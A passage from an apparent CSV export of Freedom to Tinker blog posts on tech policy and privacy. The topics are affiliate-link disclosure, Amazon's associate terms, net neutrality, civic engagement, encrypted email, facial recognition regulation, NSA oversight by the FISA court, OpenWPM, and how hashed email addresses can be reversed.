disclosures—ones that need to accompany affiliate links—-which content creators placed along with their content, both on YouTube and Pinterest. How we found affiliate links. To study this empirically, we gathered two large datasets consisting of nearly half a million YouTube videos and two million Pinterest pins. We then examined the description of the YouTube videos and the Pinterest pins to look for affiliate links. This was a challenging problem, since there is no comprehensive public repository of affiliate marketing companies and links. However, affiliate links do contain predictable patterns, because they are designed to carry information about the specific content creator and merchant. For instance, an affiliate link to Amazon contains the tag URL parameter that carries the name of the creator who is set to make money from the sale. Using this insight, we created a database containing all sub-domains, paths and parameters that appeared with a given domain. We then examined this database and manually classified each entry either as affiliate or non-affiliate by searching for information about the organization owning that domain and sometimes even signing up as affiliates to validate our findings. Through this process, we compiled a list of 57 URL patterns from 33 affiliate marketing companies, the most comprehensive publicly available curated list of this kind (see Appendix in the paper, and GitHub repo). How we scanned for disclosures. We could expect to find affiliate link disclosures either in the description of the videos or pins, during the course of the video, or on the pin’s image. We began our analysis by manually inspecting 20 randomly selected affiliate videos and pins, searching for any mention about the affiliate nature of the accompanying URLs. We found that none these videos or pins conveyed this information. Instead, we turned our attention to inspecting the descriptions of the videos and pins. Given that any sentence (or phrase) could contain a disclosure, we first parsed descriptions into sentences using automated methods. We then clustered these sentences using hierarchical clustering, and manually identified the clusters of sentences that represented disclosure wording. What we found. Of all the YouTube videos and Pinterest pins that contained affiliate links, only ~10% and ~7% respectively contained accompanying disclosures. When these disclosures were present, we could classify them into three types: Affiliate link disclosures: The first type of disclosures simply stated that the link was an “affiliate link”, or that “affiliate links were included”. On YouTube and Pinterest these type of disclosures were present on ~7% and 4.5% of all affiliate videos and pins respectively. Explanation disclosures: The second type of disclosures attempted to explain what an affiliate link was, on the lines of “This is an affiliate link and I receive a commission for the sales”. These disclosures—which are of the type the FTC expects in its guidelines—only appeared ~2% each of all affiliate videos and pins. Support channel disclosures: Finally, the third type of disclosures—exclusive to YouTube—told users that they would be supporting the channel by clicking on the links in the description (without exactly specifying how). These disclosures were present in about 2.5% of all affiliate videos. In the paper, we present additional findings, including how the disclosures varied by content type, and compare the engagement metrics of affiliate and non-affiliate content. Cause for concern. Our results paint a bleak picture: the vast majority of affiliate content on both platforms has no accompanying disclosures. Worse, Affiliate link disclosures—ones that the FTC specifically advocates against using—were the most prevalent. In future work, we hope to investigate the reason behind this lack of disclosure. Is it because the affiliates are unaware that they need to disclose? How aware are they of the FTC’s specific guidelines? Further, we are concluding a user study that examines the efficacy of these disclosures as they exist today: Do users think of affiliate content as an endorsement by the content creator? Do users notice the accompanying disclosures? What do the disclosures communicate to users? What can be done? Our results also provide several starting points for improvement by various stakeholders in the affiliate marketing industry. For instance, social media platforms can do a lot more to ensure content creators disclose their relationships with advertisers to end-users, and that end-users understand the relationship. Recently, YouTube and Instagram have taken steps in this direction, releasing tools that enable disclosures, but it’s unlikely that any one type of disclosure will cover all marketing practices. Similarly, affiliate marketing companies can hold their registered content creators accountable to better standards. On examining the affiliate terms and conditions of the eight most common affiliate marketing companies in our dataset, we noted only two explicitly pointed to the FTC’s guidelines. Finally, we argue that web browsers can do more in helping users identify disclosures by means of automated detection of these disclosures and content that needs to be disclosed. Machine learning and natural language processing techniques can be of particular help in designing tools that enable such automatic analyses. We are working towards building a browser extension that can detect, present and explain these disclosures to end-users."
"74","2018-05-11","2023-03-24","https://freedom-to-tinker.com/2018/05/11/when-terms-of-service-limit-disclosure-of-affiliate-marketing/","By Arunesh Mathur, Arvind Narayanan and Marshini Chetty In a recent paper, we analyzed affiliate marketing on YouTube and Pinterest. We found that on both platforms, only about 10% of all content with affiliate links is disclosed to users as required by the FTC’s endorsement guidelines. One way to improve the situation is for affiliate marketing companies (and other “influencer” agencies) to hold their registered content creators to the FTC’s endorsement guidelines. To better understand affiliate marketing companies’ current practices, we examined the terms and conditions of eleven of the most common affiliate marketing companies in our dataset, and specifically noted whether they required content creators to disclose their affiliate content or whether they mentioned the FTC’s guidelines upon registration. Affiliate program Requires disclosure? AliExpress No Amazon Yes Apple No Commission Junction No Ebay Yes Impact Radius No Rakuten Marketing No RewardStyle N/A ShopStyle Yes ShareASale No The table above summarizes our findings. All the terms and conditions were accessed May 1, 2018 from the affiliate marketing companies’ websites. We did not hyperlink those terms and conditions that were not available publicly. All the companies that required disclosure also mentioned the FTC’s endorsement guidelines. Out of the top 10 programs in our corpus, only 3 explicitly instructed their creators to disclose their affiliate links to their users. In all three cases (Amazon, Ebay, and ShopStyle), the companies called out the FTC’s endorsement guidelines. Of particular interest is Amazon’s affiliate marketing terms and conditions (Amazon was the largest affiliate marketing program in our dataset). Amazon’s terms and conditions: When content creators sign up on Amazon’s website, they are bound by the programs terms and agreements Section 5 titled: “Identifying Yourself as an Associate”. Figure 1: The disclosure requirement in Section 5 of Amazon’s terms and conditions document. As seen in Figure 1, the terms of Section 5 do not explicitly mention the FTC’s endorsement guidelines but constrain participants to add only the following disclosure to their content: “As an Amazon Associate I earn from qualifying purchases”. In fact, the terms go so far as to warn users that “Except for this disclosure, you will not make any public communication with respect to this Agreement or your participation in the Associates Program”. However, if participants click on the “Program Policies” link in the terms and conditions—which they are also bound to by virtue of agreeing to the terms and conditions—they are specifically asked to be responsible for the FTC’s endorsement guidelines (Figure 2): “For example, you will be solely responsible for… all applicable laws (including the US FTC Guides Concerning the Use of Endorsement and Testimonials in Advertising)…”. Here, Amazon asks the content creators to comply with the FTC’s guidelines, without exactly specifying how. It is important to note that the FTC’s guidelines themselves do not enforce any specific disclosure statement constraints on content creators, but rather suggest that content creators use clear and explanatory disclosures that convey the advertising relationship behind affiliate marketing to users. Figure 2: The disclosure requirement from Amazon’s “Program Policies” page. We learned about these clauses from the coverage of our paper on BBC’s You and Yours podcast (~ 16 mins in). A YouTuber on the show pointed out that he was constrained by the Amazon’s clause to not disclose anything about the affiliate program publicly. Indeed, as we describe in the above sections, Amazon’s terms and conditions seem contradictory to their Program Policies. On the one hand, Amazon binds its participants to the FTC’s endorsement guidelines but on the other, Amazon severely constrains the disclosures content creators can make about their participation in the program. Further, researchers are still figuring out which types of disclosures are effective from a user perspective. Content creators might want to adapt the form and content of disclosures based on the findings of such research and the affordances of the social platforms. For example, on YouTube, it might be best to call out the affiliate relationship in the video itself—when content creators urge participants to “check out the links in the description below”—rather than merely in the description. The rigid wording mandated by Amazon seemingly prevents such customization, and may not make the affiliate relationship adequately clear to users. Affiliate marketing companies wield strong influence over the content creators that register with their programs, and can hold them accountable to ensure they disclose these advertising relationships in their content. At the very least, they should not make it harder to comply with applicable laws and regulations."
"75","2013-05-24","2023-03-24","https://freedom-to-tinker.com/2013/05/24/arlington-v-fcc-what-it-means-for-net-neutrality/","[Cross-posted on my blog, Managing Miracles] On Monday, the Supreme Court handed down a decision in Arlington v. FCC. At issue was a very abstract legal question: whether the FCC has the right to interpret the scope of its own authority in cases in which congress has left the contours of their jurisdiction ambiguous. In short, can the FCC decide to regulate a specific activity if the statute could reasonably be read to give them that authority? The so-called Chevron doctrine gives deference to administrative agencies’ interpretation of of their statutory powers, and the court decided that this deference extends to interpretations of their own jurisdiction. It’s all very meta, but it turns out that it could be a very big deal indeed for one of those hot-button tech policy issues: net neutrality. Scalia wrote the majority opinion, which is significant for reasons I will describe below. The opinion demonstrated a general skepticism of the telecom industry claims, and with classic Scalia snark, he couldn’t resist this footnote about the petitioners, “CTIA—The Wireless Association”: This is not a typographical error. CTIA—The Wireless Association was the name of the petitioner. CTIA is presumably an (unpronounceable) acronym, but even the organization’s website does not say what it stands for. That secret, known only to wireless-service-provider insiders, we will not disclose here. Ha. Ok, on to the merits of the case and why this matters for net neutrality. Verizon v. FCC is a long-running case currently in DC Circuit court, arising out of Verizon’s challenge to the FCC’s “Open Internet Order.” It all started in 2010, but for a variety of reasons it has moved at a snail’s pace. They haven’t even scheduled oral arguments yet. On one side, Verizon claims that the FCC does not have the authority to implement the non-discrimination rules contained in the order, and that they as a company have a First Amendment right to discriminate. On the other side, the FCC has asserted a patchwork of statutory theories for why they can enforce the order. The Commission also claims that the free speech arguments by Verizon are bogus because the company is merely a carrier of speech and, if anything, the free speech obligations should counsel in favor of non-discrimination. These arguments are largely untested ground for both sides. Although Verizon’s free speech argument may seem rather dubious, it might nevertheless turn out to be a legal winner in light of cases like Citizens United. The FCC’s “carrier of speech” argument fits a common-sense notion of what telecommunications companies do. Unfortunately for the Commission, it has already chosen to “deregulate” internet communications by stating that they are not “common carriers” — that is, entities that are traditionally obliged to deliver communications without discrimination. Instead, they articulated the patchwork of other statutory theories — the so-called “ancillary jurisdiction” approach. As others have observed, the decision in Arlington gives the FCC a much better shot at winning the ancillary jurisdiction argument in the Verizon case. Tim Lee thinks that on balance this is a bad thing for public policy, because it contributes to regulatory jurisdiction creep. I can appreciate his position. Let’s assume for a moment that the FCC loses the Verizon case in the DC Circuit. If the Supreme Court hears the case, it would be quite entertaining indeed. That’s because Scalia has some strong views on how broadband should be classified and what jurisdiction the FCC should have. This takes us back to a case in 2005, NCTA v. Brand X. In that case, a company named Brand X Internet Services claimed that cable-based broadband internet service was indeed a “common carrier” service. The FCC was at the time proceeding with its novel approach to “deregulating” broadband internet by stating that it was not a common carrier but instead subject to ancillary jurisdiction. The logical and legal acrobatics of this approach were quite impressive. The Supreme court, in an 8 to 1 vote applied Chevron deference to the FCC’s interpretation of the statute, and let it stand. Scalia dissented vociferously. He simply didn’t think that the statute was ambiguous. Broadband internet was a a common carrier service, rather than some new “information service” under the FCC’s “deregulated” scheme (see his extended pizzeria metaphor). He also noted that the Court’s decision (and the concurring opinions) would permit the FCC to change its mind and reclassify broadband as a common carrier under the Chevron doctrine. As he said: “In other words, what the Commission hath given, the Commission may well take away–unless it doesn’t.” In the lead-up to Verizon v. FCC, the Commission actually considered relying on this so-called “Title II” reclassification approach initially, but rejected it at the time because it was too politically sensitive (telcos/cablecos have friends in Congress). So, even if Verizon wins the case at the DC Circuit, and even if the Supreme Court does not reverse the DC Circuit, the FCC could take the significant (and, logical, to Scalia) approach of common-carrier classification. Arlington supports this approach, and the FCC filed a letter with the court yesterday noting this fact. Verizon, for what it’s worth, filed a letter citing a recent DC Circuit opinion upholding the free speech rights of corporate conveyors of speech against control by others. [Update: The FCC replied, explaining why this opinion was not germane.] For Verizon, there is no going back now. They have staked out their position and will defend it to the hilt. Many other broadband internet providers (including the cable companies) decided not to take part in this battle. MetroPCS, the other appellant, pulled out last week. Intervenor “CTIA—The Wireless Association”, represented by Jonathan Nuechterlein of WilmerHale, pulled out last summer. I, for one, am looking forward to oral arguments."
"76","2014-05-29","2023-03-24","https://freedom-to-tinker.com/2014/05/29/increasing-civic-engagement-requires-understanding-why-people-have-chosen-not-to-participate/","Last month, I was a poll watcher for the mayoral primary in Washington, DC. My duties were to monitor several polling places to confirm that each Precinct Captain was ensuring that the City’s election laws were being followed on site; in particular, that everyone who believed that they were qualified to vote was able to do so, even if through a provisional ballot. While, thankfully, I did not witness any violations of DC law, I also did not see many voters. The turnout for the election was the lowest since 1974, the beginning of home rule in the District of Columbia. Only 27% of registered voters cast ballots. Between conversations with friends and neighbors and reading post-mortems on the election, anecdotal evidence abounds as to why turnout was so low. Maybe people opted not to vote out of disgust with the current political climate in the city after witnessing a series of Federal investigations and indictments of local elected officials and campaign staff. Maybe switching the primary from its customary Fall date to early April confused voters and many did not realize Election Day was April 1st. Maybe none of the candidates were truly inspiring, so voters chose not to educate themselves about their choices. I spoke to an acquaintance soon after Election Day who told me that he had not voted because, even though he knew he would be out of town on Election Day, he did not find time to vote early or get an absentee ballot. Yet, on Election Day, I met a young man who was voting despite still suffering significant after effects from being shot in the head twice. Into this complicated environment comes an exciting new start-up – Brigade Media. Napster co-founder and billionaire Sean Parker has raised a $9.3 million round of funding for his new company, which seeks to boost the level of civic engagement, including voting, among U.S. residents. A VentureBeat article says that Brigade Media will address issues at the Federal, state and local levels. An article in Politico suggests that “[t]he company will focus on underlying societal problems that make it difficult for citizens to engage in government.” If Brigade Media is able to address some of the underlying barriers to political participation in the U.S., it has the potential to be an extremely influential company. For me, its success would be defined, at least in terms of social impact, by expanding the number of people who vote and otherwise participate in the political process and by amplifying the voices, between election days, of people who currently vote. According to some 2013 Pew research, the greatest barriers to civic participation – and, also, home broadband adoption – are income and education. People who live in higher income households and who have attended or graduated from college are consistently more likely than people with lower incomes or education levels to take part in many online and offline civic behaviors, including: (1) Working with fellow citizens to solve a problem in one’s community; (2) Attending a political meeting on local, town, or school affairs; (3) Being an active member of a group that tries to influence public policy or government; (4) Attending a political rally or speech; (5) Working or volunteering for a political party or candidate; (6) Contacting a government official about an important issue, either online or offline; (7) Signing a petition, either digitally or on paper; and (8) Commenting on a news story or blog post online. There is some evidence that neighborhoods in Washington, DC with higher incomes and greater college graduation rates saw greater levels of participation in the April primary election. For example, in the zip code containing Precinct 120, where the 15% voter turnout was approximately 18% less than turnout for the 2010 mayoral primary, the median household income is below the Washington, DC average, the unemployment percentage is above average, and percentage of the population with a college degree is significantly below average for the City, according to city-data.com. In contrast, according to the same website, in the zip code housing precinct 52, voter turnout actually increased between 2010 and 2014 from approximately 49% to approximately 50%, while household income is significantly above the Washington, DC average, unemployment is significantly below average, and the percentage of people with a bachelor’s degree or higher is above average for Washington, DC. Brigade Media and other organizations certainly can affect civic participation both by better utilizing existing technology and developing new applications, even if voter turnout will always depend at least to some degree on the particular candidates running for office and the political climate at the time of the election. Developing tools that are tailored to both desktop and mobile devices will be critical, given the political participation and broadband adoption disparities across different demographic groups. While home broadband connections are still very important for researching civic issues and engaging in on-line political organizing, identifying ways to foster more meaningful political participation through mobile devices will reap the greatest dividends. I can envision new applications, specifically created for politics, which allow people to take advantage of two of the best aspects of smartphone ownership – short messaging and photo tools – to enable new ways of organizing which are less reliant on a desktop platform. I can also imagine a new fundraising application that allows one person to solicit and bundle numerous small contributions also without having to use a dedicated desktop application. Easing ongoing access to participation in the political process should make people feel more invested in their communities and ultimately more likely to participate on Election Day. It is welcome news when any new organization, for-profit or non-profit, takes on this important mission."
"77","2013-10-16","2023-03-24","https://freedom-to-tinker.com/2013/10/16/engineering-an-insider-attack-resistant-email-system-and-why-you-wouldnt-want-to-use-it/","Earlier this week, Felten made the observation that the government eavesdropping on Lavabit could be considered as an insider attack against Lavabit users. This leads to the obvious question: how might we design an email system that’s resistant to such an attack? The sad answer is that we’ve had this technology for decades but it never took off. Phil Zimmerman put out PGP in 1991. S/MIME-based PKI email encryption was widely supported by the late 1990’s. So why didn’t it become ubiquitous? Usability. It’s a huge pain to set up and manage PGP encrypted email, even among a small group. See, for example, Whitten and Tygar’s paper on this exact topic. Closer to home for me, every member of the 2007 California Top to Bottom Review of electronic voting systems used OpenPGP for our internal communications. We even cheated and had a shared private key for our shared mail alias, rather than per-user private keys. While in the end it did work, particularly making it easy to clean things up when our work was finished — everybody just deleted their copy of the private key and we no longer had to worry about all the copies of the ciphertexts floating around — we had all sorts of weird hiccups along the way, and we’re talking about a group of security professionals. The S/MIME universe with hierarchical PKI seems to work reasonably well in closed, centrally administrated domains (i.e., internal email for a single company), but cross-domain secure communication again never really took off. Features. I was an early beta user of Google’s Gmail and I was immediately hooked. Having instantaneous search over all my email was a powerful feature. Now, with a decade of my email all indexed and available, it’s invaluable. If I was using PGP or something like it, then I’d be giving up on all of Gmail’s search features. And then there’s Gmail’s truly effective spam filtering. Prior to Gmail, I spent a lot of effort training a local Bayesian filter, and it never came close to what Gmail does. In an encrypted world, the servers in the middle can’t help you as much with reducing spam. The more data they’ve got, the better they can protect you against spam, phishing, malware, etc. (These same benefits apply to many other webmail services; I’m not trying to argue for the superiority of Gmail relative to other webmail services.) Speed. A big part of why Gmail is fast, even when you’re using a slow crappy connection, is that a lot of the data stays on the server. If somebody emails you a big attachment and you forward it on to somebody else, it’s never downloaded to your browser. It just gets passed along. Everything about webmail (or custom smartphone email apps) is built around speed. Conversely, with encrypted email, your client would need to download everything, assemble the new email, encrypt it, then push it back upstream. On a crappy connection, this would be unacceptably slow. If you want to have communications where a man-in-the-middle attacker can’t read your messages, then you need to have local cryptographic secrets. There’s just no way around it. Even if you try to be clever, supporting features like search over encrypted data on the server, you’ll never approach the efficiency and features available when the server can see the plaintext of your email. Is there an alternative? It might be possible to build a distributed social network that does the right thing. (Diaspora isn’t dead yet, but clearly isn’t ready for prime time. Daniel Sandler and I came up with something similar in 2008/2009 called FETHR. FETHR has very strong integrity but no privacy features. Frientegrity adds privacy.) One clever part of trying to build traditional public key cryptography into a social network is that the social network effectively implements a PGP-style web of trust. If Alice comments on one of Bob’s posts, and everything is digitally signed and hash-chained together, then you now have a path from Alice that implicitly endorses Bob’s public key. This effectively solves one of the hardest parts of the puzzle: scaling up the public key discovery and validation problem. Unfortunately, once you start properly encrypting messages, the server again can’t help you with spam and malware (although it’s easier to ignore people who you’re not “following”, which is a partial win). Neither the Diaspora, FETHR, nor Frientegrity designs make any attempt to unlink the sender from the recipient. Users could potentially follow one another through Tor, although that would put a lot of stress of Tor if the system got too big; it also wouldn’t help when you want to comment on a post with your real identity rather than anonymously. Potentially worse, every user in these systems is effectively divulging the volume of data they’re publishing; any post-facto observer of your published/encrypted timeline can see when you’re active and when you’re not. Suffice to say, that at least for the foreseeable future, you won’t be abandoning your favorite webmail service, at least for the bulk of your emailing needs. If you anticipate needing to communicate securely, even in the face of compromised email servers, then you’re going to want to dive into the world of OpenPGP. If you want to defend against an observer reconstructing your social graph, off-the-shelf tools aren’t going to help you and you’ll need to cobble things together on your own."
"78","2022-04-07","2023-03-24","https://freedom-to-tinker.com/2022/04/07/citp-case-study-on-regulating-facial-recognition-technology-in-canada/","Canada, like many jurisdictions in the United States, is grappling with the growing usage of facial recognition technology in the private and public sectors. This technology is being deployed at a rapid pace in airports, retail stores, social media platforms, and by law enforcement – with little oversight from the government. To help address this challenge, I organized a tech policy case study on the regulation of facial recognition technology with Canadian members of parliament – The Honorable Greg Fergus and Matthew Green. Both sit on the House of Commons’ Standing Committee on Access to Information, Privacy, and Ethics (ETHI) Committee and I served as a legislative aide to them through the Parliamentary Internship Programme before joining CITP. Our goal for the session was to put policymakers in conversation with subject matter experts. The core problem is that there is lack of accountability in the use of facial recognition technology that excarbates historical forms of discrimination and puts marginalized communities at risk for a wide range of harms. For instance, a recent story describes the fate of three black men who were wrongfully arrested because of being misidentified by facial recognition software. As the Canadian Civil Liberties Association argues, the police’s use of facial recognition technology, notably provided by the New York-based company, Clearview AI, “points to a larger crisis in police accountability when acquiring and using emerging surveillance tools.” A number of academics and researchers – such as DAIR Instititute’s Timnit Gebru and the Algorithmic Justice League’s Joy Buolamwini, who documented the missclassification of darker-skinned women in a recent paper – are bringing attention to the discriminatory algorithms associated with facial recognition that have put racialized people, women, and members of the LGBTIQ community, at greater risk of false identification. Meanwhile, Canadian officials are beginning to tackle the real world consequences of the use of facial recognition. A year ago, the Office of the Privacy Commissioner found that Clearview AI, had scraped billions of images of people from from the internet in what “represented mass surveillance and was a clear violation of the privacy rights of Canadians.” Following that investigation, Clearview AI stopped providing services to the Canadian market, including the Royal Canadian Mounted Police. In light of these findings and the absence of dedicated legislation, the ETHI Committee began studying the uses of facial recognition technology in May 2021, and has recently resumed this work by focusing on the use by various levels of government in Canada, law enforcement agencies, and private corporations. The CITP case study session on March 24, began with a presentation by Angelina Wang, a graduate affiliate of CITP, who provided a technical overview where she explained the different functions and harms associated with this technology. Following Wang’s presentation, I provided a regulatory overview of how U.S. lawmakers have addressed facial recognition by noting the different legislative strategies deployed for law enforcement, private, and public sector uses. We then had a substantive, free-flowing discussion with CITP researchers and the policymakers about the challenges and opportunities for different regulatory strategies. Following CITP’s case study session, Wang and Dr. Elizabeth Anne Watkins, a CITP Fellow, were invited to testify before the ETHI committee in an April 4 hearing. Wang discussed the different tasks facial recognition technology can and cannot perform, how the models are created, why they are susceptible to adversarial attacks, and the ethical implications behind the creation of this technology. Dr. Watkins’ testimony provided an overview of the privacy, security, and safety concerns related to the private industry’s use of facial verification on workers as informed by her research. The committee is expected to report its findings by the end of May 2022. We continue to do research on how Canada might regulate facial recognition technology and will publish those analyses in the coming months."
"79","2013-08-22","2023-03-24","https://freedom-to-tinker.com/2013/08/22/nsa-the-fisa-court-and-risks-of-tech-summaries/","Yesterday the U.S. government released a previously-secret 2011 opinion of the Foreign Intelligence Surveillance Court (FISC), finding certain NSA surveillance and analysis activities to be illegal. The opinion, despite some redactions, gives us a window into the interactions between the NSA and the court that oversees its activities—including why oversight and compliance of surveillance are challenging. The opinion has enough (unredacted) technical detail to get a basic picture of what the NSA was doing. The court was considering the NSA’s capture of traffic from Internet backbone links (“upstream capture”), which accounted for about 9% of the Internet traffic captured by the NSA. (The other 91% came directly from service providers, for example when email providers turned over the contents of targeted accounts.) The eavesdropping apparatus would do some kind of pattern matching on the traffic it saw, and would record traffic that “hit” on an approved pattern. Captured data would go into a database where human analysts could search and examine it. The NSA was supposed to be capturing one discrete “communication” (e.g. an email message) at a time, but due to limitations in the capture technology they could only capture data in a unit called a “transaction” (e.g. an interaction between a user’s computer and an email server while the user was reading email). About 90% of the transactions that were captured contained only a single communication. The remaining 10% of transactions were Multi-Communication Transactions (“MCTs”), meaning that they contained at least one communication that hit on a pattern, along with one or more other communications that might not be a hit. Based on the opinion plus remarks by officials in a press call yesterday, it appears that the NSA had a list of “targeted” email addresses that it was allowed to monitor, and the capture technology would grab a chunk of data such as an Internet packet, whenever one of the targeted email addresses was contained in that chunk. The NSA said it had no reasonable way to capture more precisely—although the detailed limitations of the NSA’s capture technology were redacted. The Court took these technical limitations at face value but said that these limitations did not make the resulting over-capture legal. The Court scolded the NSA: The Court is troubled that the government’s revelations regarding NSA’s acquisition of Internet transactions mark the third instance in less than three years in which the government has disclosed a substantial misrepresentation regarding the scope of a major collection program. In March, 2009, the Court concluded that its authorization of NSA’s bulk acquisition of telephone call detail records from [redacted] … “ha[d] been premised on a flawed depiction of how the NSA uses [the acquired] metadata,” and that “[t]his misperception by the FISC existed from the inception of its authorized collection in May 2006, buttressed by repeated inaccurate statements made in the government’s submissions, and despite a government-devised and Court-mandated oversight regime.” (footnote 14 on p. 16) This footnote has been much-quoted as evidence of the Court’s disappointment. What struck me in this passage, though, is that the Court was unhappy because the NSA withheld important technical details. Whenever technologists have to interact with less-technical courts or policymakers, there are communication challenges. It’s not helpful to tell the non-expert everything about how the system works—supplying too much detail is can be just as detrimental to decision-making as supplying too little. You have to supply a summary. The trick is to supply a summary containing just the right details, that is, the details that matter to the non-expert in light of what they are trying to accomplish. If a non-expert judge needs to decide whether an activity is lawful, they need to know the details that relate to the legal questions they are considering. Choosing which details to reveal can be very challenging—you have to understand something of the law, along with the technology—even if you’re doing your level best to help the decisionmaker. And if your motivations are less pure, it’s all too feasible to cook up a misleading summary of the facts. The Court seemed to suspect that the NSA had been doing exactly that. Our legal system normally addresses this unreliable-summary problem by relying on the adversarial process. The opposing party gets access to the underlying facts and can cross-examine the expert who provides the summary. This process isn’t perfect but it does tend to deter and correct unreliable summaries. This safeguard is not in place when the FISC is considering NSA activities. The FISC has no choice but to rely on the NSA’s own summary of the technical details. Even if NSA employees are trying in good faith to tell the Court what it needs to know, it’s not too hard to see how human error plus institutional pressures could lead the agency to not reveal “unhelpful” facts. Congress could address this problem by changing the law to create an opposing party in FISC procedures—a change that the President recently endorsed. But a really effective opposing party will need to have access to technical evidence and expertise as well."
"80","2013-10-02","2023-03-24","https://freedom-to-tinker.com/2013/10/02/senate-judiciary-testimony-fisa-oversight/","I testified today at a Senate Judiciary committee hearing on Oversight of the Foreign Intelligence Surveillance Act. Here is the written testimony I submitted."
"81","2019-04-12","2023-03-24","https://freedom-to-tinker.com/2019/04/12/citps-openwpm-privacy-measurement-tool-moves-to-mozilla/","As part of my PhD at Princeton’s Center for Information Technology Policy (CITP), I led the development of OpenWPM, a tool for web privacy measurement, with the help of many contributors. My co-authors and I first released OpenWPM in 2014 with the goal of lowering the technical costs of large-scale web privacy measurement. The tool’s success exceeded our expectations; it has been used by over 30 academic studies since its release, in research areas ranging from computer science to law. OpenWPM has a new home at Mozilla. After graduating in 2018, I joined Mozilla’s security engineering team to work on strengthening Firefox’s tracking protection. We’re committed to ensuring users are protected from tracking by default. To that end, we’ve migrated OpenWPM to Mozilla, where it will remain open source to ensure researchers have the tools required to discover privacy-infringing practices on the web. We are also using it ourselves to understand the implications of our new anti-tracking features, to discover fingerprinting scripts and add them to our tracking protection lists, as well as to collect data for a number of ongoing privacy research projects. Over the past six months we’ve started a number of efforts to significantly improve OpenWPM: 1. Cloud-friendly data storage. OpenWPM has long used SQLite to store crawl data. This makes it easy for anyone to install the tool, run a small measurement, and inspect the dataset locally. However, this is very limiting for large-scale measurements. OpenWPM can now save data directly to Amazon S3 in Parquet format, making it possible to launch crawls on a cluster of machines. 2. Support for modern versions of Firefox. We are in the process of migrating all of OpenWPM’s instrumentation to WebExtensions, which is necessary to run measurements with Firefox 57+. 2. Modular instrumentation. OpenWPM’s instrumentation was previously deeply embedded in the crawler, making it difficult to use outside of a crawling context. We’ve now refactored the instrumentation into a separate npm package that can easily be imported by any Firefox WebExtension. In fact, we’ve already used the module to collect data in one of our user studies. 4. A standard set of analysis utilities. To further ease analyses on OpenWPM datasets, we’ve bundled the many small utility functions we’ve developed over the years into a single utilities package available on PyPI. 5. Data collection and release. Since 2015, CITP has collected monthly 1-million-site web measurements using OpenWPM. All of this data is available for download, but once Gunes Acar moves on from CITP in a few months, the CITP measurements will end. At Mozilla, we are exploring options to regularly collect and release new measurements. All of these efforts are still underway, and we welcome community involvement as we continue to build upon them. You can find us hanging out in #openwpm on irc.mozilla.org."
"82","2018-04-09","2023-03-24","https://freedom-to-tinker.com/2018/04/09/four-cents-to-deanonymize-companies-reverse-hashed-email-addresses/","[This is a joint post by Gunes Acar, Steve Englehardt, and me. I’m happy to announce that Steve has recently joined Mozilla as a privacy engineer while he wraps up his Ph.D. at Princeton. He coauthored this post in his Princeton capacity, and this post doesn’t necessarily represent Mozilla’s views. — Arvind Narayanan.] Datafinder, an email marketing company, charges $0.04 to recover an email address from its hash. Your email address is an excellent identifier for tracking you across devices, websites and apps. Even if you clear cookies, use private browsing mode or change devices, your email address will remain the same. Due to privacy concerns, tracking companies including ad networks, marketers, and data brokers use the hash of your email address instead, purporting that hashed emails are “non-personally identifying”, “completely private” and “anonymous”. But this is a misleading argument, as hashed email addresses can be reversed to recover original email addresses. In this post we’ll explain why, and explore companies which reverse hashed email addresses as a service. Email hashes are commonly used to match users between different providers and databases. For instance, if you provide your email to sign up for a loyalty card at a brick and mortar store, the store can target you with ads on Facebook by uploading your hashed email to Facebook. Data brokers like Acxiom allow their customers to look up personal data by hashed email addresses. In an earlier study, we found that email tracking companies leak hashed emails to data brokers. How hash functions work Hash functions take data of arbitrary length and convert it into a random-looking string of fixed length. For instance, the MD5 hash of *protected email* is b58996c504c5638798eb6b511e6f49af. Hashing is commonly used to ensure data integrity, but there are many other uses. Hash functions such as MD5 and SHA256 have two important properties that are relevant for our discussion: 1) the same input always yields the same output (deterministic); 2) given a hash output, it is infeasible to recover the input (non-invertible). The determinism property allows different trackers to obtain the same hash based on your email address and match your activities across websites, devices, platforms, or online-offline realms. However, for hashing to be non-invertible, the number of possible inputs must be so large and unpredictable that all possible combinations cannot be tried. For instance, in a 2012 blog post, Ed Felten, then the FTC’s Chief Technologist, argued that hashing all possible SSNs would take “less time than it takes you to get a cup of coffee”. The huge number of possible email addresses makes naively iterating over all possible combinations infeasible. However, the number of existing email addresses is much lower than the number of possible email addresses — a recent estimate puts the total number of email addresses at around 5 billion. That may sound like a lot, but hashing is an extremely fast operation; so fast that one can compute 450 Billion MD5 hashes per second on a single Amazon EC2 machine a the cost of $0.0069 [1]. That means hashing all five billion existing email addresses would take about ten milliseconds and cost less than a hundredth of a cent. Lists of email addresses are widely available Once an email address is known, it can be hashed and compared against supposedly “anonymous” hashed email addresses. This can be done by marketing or advertising companies that use hashed email addresses as identifiers, or hackers who acquire hashed addresses by other means. Indeed, there are several options to obtain email addresses: Data breaches: Thanks to a steady stream of data breaches, hundreds of millions of email addresses from existing leaks are publicly available. HaveIBeenPwned, a service that allows users to check if their accounts have been breached, has observed more than 4.9 Billion breached accounts. Want to check if your email address is vulnerable to this attack? Use HaveIBeenPwned to determine if any of your email addresses were leaked in a data breach. If they were, an attacker would be able to use data from a breach to recover your email addresses from their hashes [2]. Marketing email lists: Mailing lists with millions of addresses are available for bulk purchase, and often are labeled with privacy invasive categories like religious affiliation, medical conditions or addictions including “Underbanked”, “Financially Challenged”, “Gamblers”, “High Blood Pressure Sufferers in Tallahassee, Florida”, “Anti-Sharia Christian Conservatives”, “Muslim Prime Prospects”.In addition, there are websites that readily share massive lists of email addresses. Email addresses from marketing mailing lists can also be used to reverse hashed emails. Harvesting email addresses from websites, search engines, PGP key servers: There are a number of software solutions available to extract email addresses in bulk from websites, search engines and public PGP key servers. Guessing email addresses: Email addresses can also be synthetically generated by using popular names and patterns such as *protected email*. Past studies achieved recovery rates between 42% and 70% using simple heuristics and limited resources [3]. We believe this can be significantly improved by using neural networks to generate plausible email addresses. Companies reverse email hashes as a service The hash recovery methods listed above require very basic technical skills. However, even that isn’t required to reverse hashed data as several companies reverse email hashes as a service. Datafinder – Reverse email hashes for $0.04 per email: Datafinder, a company that combines online and offline consumer data, charges $0.04 per email to reverse hashed email addresses. The company promises 70% recovery rate and for a nominal fee will provide additional information along with the reversed email, including: name, address, city, state, zip and phone number. Datafinder is accredited by Better Business Bureau with an A+ rating, and its clients include T-Mobile. In addition to reversing hashed email addresses, Datafinder also provides personal information including name, address and phone number associated with an email address. Infutor – Sub 500-millisecond hashed email “decoding”.: Infutor, a consumer identity management company states “[a]nonymous hashed data can be matched to a database of known hashed information to provide consumer contact information, insights and demographic information”. In one case study, the company 